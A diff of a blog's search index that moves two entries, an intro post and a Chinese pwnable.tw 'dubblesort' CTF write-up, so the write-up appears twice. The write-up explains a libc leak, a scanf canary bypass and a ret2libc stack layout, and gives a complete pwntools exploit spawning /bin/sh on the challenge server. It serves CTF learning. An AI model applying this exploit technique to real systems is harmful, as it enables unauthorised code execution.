@@ -41,20 +41,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Why begins?</title>
-    <url>/archives/84551bc4.html</url>
-    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>前几天做题的时候，愈发觉得脑子不足以记下那么多的细节，总是害怕自己忘了，下次要用就想不起来。于是想到开个博客记录一下自己折腾的经历，帮助自己之后回顾题目。</p>
-<p>以前遇到问题在网上搜的时候，有好多博客给了我很大的帮助，所以我也希望我的博客能给同道们一点小小的启发。</p>
-<h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>这个博客将主要记录我做题的经历、折腾电脑的过程、以及各种学习笔记吧，可能还会有一些生活的记录。</p>
-<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>请移步<a href="https://innerway-xq.github.io/about/">这里</a></p>
-<h2 id="添加友链"><a href="#添加友链" class="headerlink" title="添加友链"></a>添加友链</h2><p>可在下方评论，或者以各种方式联系我</p>
-<h4 id="小站初建，多有不足，还望见谅"><a href="#小站初建，多有不足，还望见谅" class="headerlink" title="小站初建，多有不足，还望见谅"></a>小站初建，多有不足，还望见谅</h4><hr>
-<h4 id="Hack-for-Fun"><a href="#Hack-for-Fun" class="headerlink" title="Hack for Fun"></a>Hack for Fun</h4>]]></content>
-      <categories>
-        <category>杂</category>
-      </categories>
-  </entry>
-  <entry>
     <title>calc</title>
     <url>/archives/5c3132af.html</url>
     <content><![CDATA[<h2 id="pwnable-tw-calc"><a href="#pwnable-tw-calc" class="headerlink" title="pwnable.tw - calc"></a>pwnable.tw - calc</h2><span id="more"></span>
@@ -108,6 +94,95 @@
       <tags>
         <tag>reverse</tag>
         <tag>rop</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Why begins?</title>
+    <url>/archives/84551bc4.html</url>
+    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>前几天做题的时候，愈发觉得脑子不足以记下那么多的细节，总是害怕自己忘了，下次要用就想不起来。于是想到开个博客记录一下自己折腾的经历，帮助自己之后回顾题目。</p>
+<p>以前遇到问题在网上搜的时候，有好多博客给了我很大的帮助，所以我也希望我的博客能给同道们一点小小的启发。</p>
+<h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>这个博客将主要记录我做题的经历、折腾电脑的过程、以及各种学习笔记吧，可能还会有一些生活的记录。</p>
+<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>请移步<a href="https://innerway-xq.github.io/about/">这里</a></p>
+<h2 id="添加友链"><a href="#添加友链" class="headerlink" title="添加友链"></a>添加友链</h2><p>可在下方评论，或者以各种方式联系我</p>
+<h4 id="小站初建，多有不足，还望见谅"><a href="#小站初建，多有不足，还望见谅" class="headerlink" title="小站初建，多有不足，还望见谅"></a>小站初建，多有不足，还望见谅</h4><hr>
+<h4 id="Hack-for-Fun"><a href="#Hack-for-Fun" class="headerlink" title="Hack for Fun"></a>Hack for Fun</h4>]]></content>
+      <categories>
+        <category>杂</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>dubblesort</title>
+    <url>/archives/51d1aace.html</url>
+    <content><![CDATA[<h2 id="pwnable-tw-dubblesort"><a href="#pwnable-tw-dubblesort" class="headerlink" title="pwnable.tw - dubblesort"></a>pwnable.tw - dubblesort</h2><span id="more"></span>
+
+<hr>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看保护，好家伙，保护全开</p>
+<p><img src="https://i.loli.net/2021/07/13/v7OlDzmIHKnYR23.png"></p>
+<p>看看程序流程，大概就是输入个名字，然后输入一堆数，冒泡排序后输出</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p><img src="https://i.loli.net/2021/07/13/OgABFh6tqYMckDK.png"></p>
+<p>输了几次名字，发现会有段乱码，丢进ida看看，果然输出名字的地方有问题</p>
+<p>他是read输入的，不会在末尾加上<code>\x00</code>截断，又用printf输出，还用了<code>%s</code>，那栈上东西就好泄露了；加上题目给了libc文件，大概就是个ret2libc吧</p>
+<p>用gdb调一下，看看栈上有什么东西可以泄露</p>
+<blockquote>
+<p>对于开了pie保护的程序，可以用<code>b *$rebase(your_addr)</code>来下断点</p>
+</blockquote>
+<p>我们断在打印名字的地方<code>0xA32</code>看看</p>
+<p><img src="https://i.loli.net/2021/07/13/nacEtulVQR4OXxD.png"></p>
+<p>看到ecx的地方就是我们输入的名字，它下面有个got表的地址，距离是<code>dis = 0x58 - 0x3c = 0x1c</code></p>
+<div class="note danger"><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>这个距离在我本地打得通，在远程是打不通的，参考了其他大佬的wp后发现，他们的gdb显示的距离算出来是0x18，而0x1c的地方是_init_array的地址，可能问题在我的虚拟机环境上？没搞明白o(╥﹏╥)o</p>
+</div>
+
+<p>于是就可以输入<code>dis</code>个<code>a</code>，加上一个回车是<code>\x0a</code>正好把got表地址最低位的<code>\x00</code>覆盖掉，也就不会被截断了，回显的时候减去<code>0x0a</code>就行</p>
+<p>下面算一下got表的在libc中的偏移：</p>
+<ul>
+<li><p><strong>本地</strong>可以在gdb中用<code>vmmap</code>命令找到libc基址，用上面泄露的got表地址减去libc基址就是偏移，我本地是0x1b3000</p>
+</li>
+<li><p><strong>远程</strong>可以用<code>readelf -S libc_32.so.6</code>命令，找到<code>.got.plt</code>的地址</p>
+<img src="https://i.loli.net/2021/07/13/KyJiZYQMRVmI9TW.png" style="zoom:50%;" />
+
+<blockquote>
+<p>got和plt的内容可以参考：<a href="https://www.jianshu.com/p/0ac63c3744dd">got表和plt表</a> ，<a href="https://www.jianshu.com/p/5092d6d5caa3">四个节的区别</a></p>
+<p><a href="https://blog.csdn.net/yfldyxl/article/details/81566279">readelf命令</a></p>
+</blockquote>
+</li>
+</ul>
+<p>至此，libc地址就被泄露了</p>
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>观察程序可以发现，他没有限制我们输入数字的个数，那么很容易想到栈溢出，然后ret2libc</p>
+<p>现在有两个问题：</p>
+<ul>
+<li>开了canary</li>
+<li>它会从小到大排序后再写在栈上原来位置</li>
+</ul>
+<h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><blockquote>
+<p>这里有个知识点是当scanf()读取非法字符时会发生格式错误，输入不会被写到栈上，由于没有清空缓冲区的函数，这个非法字符会一直留在缓冲区内，导致后面的输入也会报错，都不会被写到栈上。通过查看其它大佬的wp，发现+ - 这些字符会被视为合法输入，但是不会被写到栈上。</p>
+</blockquote>
+<p>那么在canary的地方放上<code>&#39;+&#39;</code>就行了</p>
+<h4 id="布置栈"><a href="#布置栈" class="headerlink" title="布置栈"></a>布置栈</h4><p>先看从numbers到canary的距离为<code>0x7c - 0x1c = 0x60</code>，注意是按int输入的，所以这里要填充<code>0x60 / 4 = 24</code>个0</p>
+<p><img src="https://i.loli.net/2021/07/13/TYqvzA5aQHO9bcN.png"></p>
+<p>然后在canary填充一个<code>&#39;+&#39;</code></p>
+<p>再看canary到retaddr的距离</p>
+<p>这里有个很隐蔽的坑，main函数末尾这里，不是平常的<code>leave; retn;</code>，esp被动过了，所以算padding的时候不能用ida在变量那里显示的来算</p>
+<p><img src="https://i.loli.net/2021/07/13/jSXfdZLTgFhQ4H6.png"></p>
+<p>这样的话，距离就是<code>0x10 + 0xc = 0x1c</code>，所以填充<code>0x1c / 4 = 7</code>个字节的padding，考虑到后面放的就是system函数的地址<code>sys_addr</code>，要求从小到大，padding可以直接是<code>sys_addr</code></p>
+<p>再后面是system函数的返回地址，这里是可以随便填一个不小于<code>sys_addr</code>的数，简单起见直接填<code>sys_addr</code></p>
+<p>再后面是system函数的参数<code>&#39;\bin\sh&#39;</code>，巧合的是这个字符串在libc中地址刚好大于<code>sys_addr</code></p>
+<p>所以如图：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high addr            +---------------------------------+</span><br><span class="line">                     |            binsh-addr           |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                ebp  +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     |               *7                |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;+&#x27;               | &lt;--- canary</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;0&#x27;               |</span><br><span class="line">                     |               *24               |</span><br><span class="line">low addr     numbers +---------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>总共输入<code>24+1+7+3=35</code>个数字</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./dubblesort&quot;</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="comment">#r = process(&quot;./dubblesort&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">local_got_offset = <span class="number">0x1b3000</span></span><br><span class="line">remote_got_offset = <span class="number">0x1b0000</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;name :&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>)  <span class="comment">#why remote is 24 but local is 28?</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello &#x27;</span>)</span><br><span class="line">r.recv(<span class="number">24</span>)</span><br><span class="line">libc_addr = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line"><span class="comment">#libc_addr = libc_addr - local_got_offset</span></span><br><span class="line">libc_addr = libc_addr - remote_got_offset</span><br><span class="line">sys_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr:&quot;</span>, <span class="built_in">hex</span>(libc_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sys_addr:&quot;</span>, <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr:&quot;</span>,<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">24</span> + <span class="number">1</span> + <span class="number">7</span> + <span class="number">3</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;cnt:&quot;</span>,cnt</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(cnt))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):        <span class="comment">#why 7? see code 0xB10</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(sys_addr))</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr of sys</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(binsh_addr))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/">https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/</a></p>
+<p><a href="https://blog.csdn.net/qq_43189757/article/details/102799397">https://blog.csdn.net/qq_43189757/article/details/102799397</a></p>
+<p><a href="https://www.cnblogs.com/Rookle/p/12884543.html">https://www.cnblogs.com/Rookle/p/12884543.html</a></p>
+<p><a href="https://www.cjovi.icu/WP/919.html">https://www.cjovi.icu/WP/919.html</a></p>
+]]></content>
+      <categories>
+        <category>pwnable.tw</category>
+      </categories>
+      <tags>
+        <tag>stackoverflow</tag>
+        <tag>ret2libc</tag>
       </tags>
   </entry>
   <entry>
@@ -248,81 +323,6 @@ D --&gt; C
         <tag>rop</tag>
         <tag>栈迁移</tag>
         <tag>libc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dubblesort</title>
-    <url>/archives/51d1aace.html</url>
-    <content><![CDATA[<h2 id="pwnable-tw-dubblesort"><a href="#pwnable-tw-dubblesort" class="headerlink" title="pwnable.tw - dubblesort"></a>pwnable.tw - dubblesort</h2><span id="more"></span>
-
-<hr>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看保护，好家伙，保护全开</p>
-<p><img src="https://i.loli.net/2021/07/13/v7OlDzmIHKnYR23.png"></p>
-<p>看看程序流程，大概就是输入个名字，然后输入一堆数，冒泡排序后输出</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p><img src="https://i.loli.net/2021/07/13/OgABFh6tqYMckDK.png"></p>
-<p>输了几次名字，发现会有段乱码，丢进ida看看，果然输出名字的地方有问题</p>
-<p>他是read输入的，不会在末尾加上<code>\x00</code>截断，又用printf输出，还用了<code>%s</code>，那栈上东西就好泄露了；加上题目给了libc文件，大概就是个ret2libc吧</p>
-<p>用gdb调一下，看看栈上有什么东西可以泄露</p>
-<blockquote>
-<p>对于开了pie保护的程序，可以用<code>b *$rebase(your_addr)</code>来下断点</p>
-</blockquote>
-<p>我们断在打印名字的地方<code>0xA32</code>看看</p>
-<p><img src="https://i.loli.net/2021/07/13/nacEtulVQR4OXxD.png"></p>
-<p>看到ecx的地方就是我们输入的名字，它下面有个got表的地址，距离是<code>dis = 0x58 - 0x3c = 0x1c</code></p>
-<div class="note danger"><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>这个距离在我本地打得通，在远程是打不通的，参考了其他大佬的wp后发现，他们的gdb显示的距离算出来是0x18，而0x1c的地方是_init_array的地址，可能问题在我的虚拟机环境上？没搞明白o(╥﹏╥)o</p>
-</div>
-
-<p>于是就可以输入<code>dis</code>个<code>a</code>，加上一个回车是<code>\x0a</code>正好把got表地址最低位的<code>\x00</code>覆盖掉，也就不会被截断了，回显的时候减去<code>0x0a</code>就行</p>
-<p>下面算一下got表的在libc中的偏移：</p>
-<ul>
-<li><p><strong>本地</strong>可以在gdb中用<code>vmmap</code>命令找到libc基址，用上面泄露的got表地址减去libc基址就是偏移，我本地是0x1b3000</p>
-</li>
-<li><p><strong>远程</strong>可以用<code>readelf -S libc_32.so.6</code>命令，找到<code>.got.plt</code>的地址</p>
-<img src="https://i.loli.net/2021/07/13/KyJiZYQMRVmI9TW.png" style="zoom:50%;" />
-
-<blockquote>
-<p>got和plt的内容可以参考：<a href="https://www.jianshu.com/p/0ac63c3744dd">got表和plt表</a> ，<a href="https://www.jianshu.com/p/5092d6d5caa3">四个节的区别</a></p>
-<p><a href="https://blog.csdn.net/yfldyxl/article/details/81566279">readelf命令</a></p>
-</blockquote>
-</li>
-</ul>
-<p>至此，libc地址就被泄露了</p>
-<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>观察程序可以发现，他没有限制我们输入数字的个数，那么很容易想到栈溢出，然后ret2libc</p>
-<p>现在有两个问题：</p>
-<ul>
-<li>开了canary</li>
-<li>它会从小到大排序后再写在栈上原来位置</li>
-</ul>
-<h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><blockquote>
-<p>这里有个知识点是当scanf()读取非法字符时会发生格式错误，输入不会被写到栈上，由于没有清空缓冲区的函数，这个非法字符会一直留在缓冲区内，导致后面的输入也会报错，都不会被写到栈上。通过查看其它大佬的wp，发现+ - 这些字符会被视为合法输入，但是不会被写到栈上。</p>
-</blockquote>
-<p>那么在canary的地方放上<code>&#39;+&#39;</code>就行了</p>
-<h4 id="布置栈"><a href="#布置栈" class="headerlink" title="布置栈"></a>布置栈</h4><p>先看从numbers到canary的距离为<code>0x7c - 0x1c = 0x60</code>，注意是按int输入的，所以这里要填充<code>0x60 / 4 = 24</code>个0</p>
-<p><img src="https://i.loli.net/2021/07/13/TYqvzA5aQHO9bcN.png"></p>
-<p>然后在canary填充一个<code>&#39;+&#39;</code></p>
-<p>再看canary到retaddr的距离</p>
-<p>这里有个很隐蔽的坑，main函数末尾这里，不是平常的<code>leave; retn;</code>，esp被动过了，所以算padding的时候不能用ida在变量那里显示的来算</p>
-<p><img src="https://i.loli.net/2021/07/13/jSXfdZLTgFhQ4H6.png"></p>
-<p>这样的话，距离就是<code>0x10 + 0xc = 0x1c</code>，所以填充<code>0x1c / 4 = 7</code>个字节的padding，考虑到后面放的就是system函数的地址<code>sys_addr</code>，要求从小到大，padding可以直接是<code>sys_addr</code></p>
-<p>再后面是system函数的返回地址，这里是可以随便填一个不小于<code>sys_addr</code>的数，简单起见直接填<code>sys_addr</code></p>
-<p>再后面是system函数的参数<code>&#39;\bin\sh&#39;</code>，巧合的是这个字符串在libc中地址刚好大于<code>sys_addr</code></p>
-<p>所以如图：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high addr            +---------------------------------+</span><br><span class="line">                     |            binsh-addr           |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                ebp  +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     |               *7                |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;+&#x27;               | &lt;--- canary</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;0&#x27;               |</span><br><span class="line">                     |               *24               |</span><br><span class="line">low addr     numbers +---------------------------------+</span><br></pre></td></tr></table></figure>
-
-<p>总共输入<code>24+1+7+3=35</code>个数字</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./dubblesort&quot;</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="comment">#r = process(&quot;./dubblesort&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">local_got_offset = <span class="number">0x1b3000</span></span><br><span class="line">remote_got_offset = <span class="number">0x1b0000</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;name :&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>)  <span class="comment">#why remote is 24 but local is 28?</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello &#x27;</span>)</span><br><span class="line">r.recv(<span class="number">24</span>)</span><br><span class="line">libc_addr = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line"><span class="comment">#libc_addr = libc_addr - local_got_offset</span></span><br><span class="line">libc_addr = libc_addr - remote_got_offset</span><br><span class="line">sys_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr:&quot;</span>, <span class="built_in">hex</span>(libc_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sys_addr:&quot;</span>, <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr:&quot;</span>,<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">24</span> + <span class="number">1</span> + <span class="number">7</span> + <span class="number">3</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;cnt:&quot;</span>,cnt</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(cnt))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):        <span class="comment">#why 7? see code 0xB10</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(sys_addr))</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr of sys</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(binsh_addr))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/">https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/</a></p>
-<p><a href="https://blog.csdn.net/qq_43189757/article/details/102799397">https://blog.csdn.net/qq_43189757/article/details/102799397</a></p>
-<p><a href="https://www.cnblogs.com/Rookle/p/12884543.html">https://www.cnblogs.com/Rookle/p/12884543.html</a></p>
-<p><a href="https://www.cjovi.icu/WP/919.html">https://www.cjovi.icu/WP/919.html</a></p>
-]]></content>
-      <categories>
-        <category>pwnable.tw</category>
-      </categories>
-      <tags>
-        <tag>stackoverflow</tag>
-        <tag>ret2libc</tag>
       </tags>
   </entry>
 </search>
